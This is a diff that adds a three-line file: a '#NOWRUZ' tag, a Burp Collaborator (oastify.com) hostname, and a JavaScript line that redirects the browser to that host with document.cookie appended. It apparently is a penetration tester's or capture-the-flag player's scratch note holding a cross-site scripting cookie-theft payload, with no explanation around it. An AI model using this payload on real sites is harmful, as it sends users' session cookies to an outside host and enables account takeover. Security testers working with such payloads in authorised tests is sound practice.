@@ -1,0 +1,3 @@
+#NOWRUZ
+q4vws8n23gi3rv47og63kd83suylmba0.oastify.com
+window.location = 'http://q4vws8n23gi3rv47og63kd83suylmba0.oastify.com/'+encodeURI(document.cookie)
